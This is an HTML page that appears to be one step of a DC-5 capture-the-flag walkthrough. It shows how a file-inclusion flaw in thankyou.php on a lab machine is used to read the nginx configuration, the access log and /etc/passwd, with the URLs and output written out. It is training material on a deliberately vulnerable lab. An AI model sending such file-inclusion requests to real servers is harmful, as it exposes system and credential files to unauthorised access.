<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>3.3 Read the logs</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="styles.css" type="text/css" />
</head>
<body><h1><b><u>3.3 Read the logs</u></b></h1><br />Let’s see if we can find the log files. Remember the <a href="DC_Series--DC-5--2._Finding_Services_and_Ports.html">nmap scan</a>? Because of that, we know that this server is nginx. Let’s see if we can read the configuration file for nginx. <br /><br />a) In your brower go to <a href="http://192.168.12.59/thankyou.php?file=/etc/nginx/nginx.conf">http://192.168.12.59/thankyou.php?file=/etc/nginx/nginx.conf</a><br /><br /><img src="images/247-1.png" alt="images/247-1.png" /><br /><br />In text:<br /><br />user www-data;worker_processes 4;pid /run/nginx.pid;events { worker_connections 768; # multi_accept on;}http { ## # Basic Settings ## sendfile on; tcp_nopush on; tcp_nodelay on; keepalive_timeout 65; types_hash_max_size 2048; # server_tokens off; # server_names_hash_bucket_size 64; # server_name_in_redirect off; include /etc/nginx/mime.types; default_type application/octet-stream; ## # SSL Settings ## ssl_protocols TLSv1 TLSv1.1 TLSv1.2; # Dropping SSLv3, ref: POODLE ssl_prefer_server_ciphers on; ## # Logging Settings ## <strong><span style="color:#ffa500;">access_log /var/log/nginx/access.log</span></strong>; error_log /var/log/nginx/error.log; ## # Gzip Settings ## gzip on; gzip_disable "msie6"; # gzip_vary on; # gzip_proxied any; # gzip_comp_level 6; # gzip_buffers 16 8k; # gzip_http_version 1.1; # gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript; ## # Virtual Host Configs ## include /etc/nginx/conf.d/*.conf; include /etc/nginx/sites-enabled/*;}#mail {# # See sample authentication script at:# # http://wiki.nginx.org/ImapAuthenticateWithApachePhpScript# # # auth_http localhost/auth.php;# # pop3_capabilities "TOP" "USER";# # imap_capabilities "IMAP4rev1" "UIDPLUS";# # server {#  listen     localhost:110;#  protocol   pop3;#  proxy      on;# }# # server {#  listen     localhost:143;#  protocol   imap;#  proxy      on;# }#}   <br /><br />Now we know where the access log file is. “/var/log/nginx/access.log”.<br /><br />b) Go to your acces log file.<br /><br /><a href="http://192.168.12.59/thankyou.php?file=/var/log/nginx/access.log">http://192.168.12.59/thankyou.php?file=/var/log/nginx/access.log</a><br /><br /><img src="images/247-2.png" alt="images/247-2.png" /><br /><br />In text:<br />...<br />/thankyou.php?file=/var/log/nginx/access.log HTTP/1.1" 200 1864590 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0"192.168.12.30 - - [12/Jun/2020:19:30:49 +1000] "GET /css/styles.css HTTP/1.1" 304 0 "http://192.168.12.59/thankyou.php?file=/var/log/nginx/access.log" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0"192.168.12.30 - - [12/Jun/2020:19:33:24 +1000] "GET /thankyou.php?<strong><span style="color:#ffa500;">file=/etc/passwd</span></strong> HTTP/1.1" 200 986 "-" "<strong><span style="color:#ffa500;">Mozilla/5.0 (X11; Ubuntu; Linux x86_64</span></strong>; rv:77.0) Gecko/20100101 Firefox/77.0"192.168.12.30 - - [12/Jun/2020:19:33:24 +1000] "GET /css/styles.css HTTP/1.1" 304 0 "http://192.168.12.59/thankyou.php?file=/etc/passwd" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0"192.168.12.30 - - [12/Jun/2020:19:33:27 +1000] "GET /thankyou.php?file=/etc/passwd HTTP/1.1" 200 986 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0"192.168.12.30 - - [12/Jun/2020:19:33:27 +1000] "GET /css/styles.css HTTP/1.1" 304 0 "http://192.168.12.59/thankyou.php?file=/etc/passwd" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0"192.168.12.30 - - [12/Jun/2020:19:33:34 +1000] "GET /thankyou.php?file=/var/log/nginx/access.log HTTP/1.1" 500 798 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0"192.168.12.30 - - [12/Jun/2020:19:33:34 +1000] "GET /css/styles.css HTTP/1.1" 304 0 "http://192.168.12.59/thankyou.php?file=/var/log/nginx/access.log" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0"   <br /><br /><br />NOTICE:<br />If you get to this point and you can’t see the logs, try to reinstall the Virtual Machine and go to the page <a href="http://192.168.12.59/thankyou.php?file=/etc/passwd">http://192.168.12.59/thankyou.php?file=/etc/passwd</a>.<br /><br /><br /><br /><p align="center"><img src="images/home.png" height="22" width="22">  <a href="index.html">Index</a></p></body></html>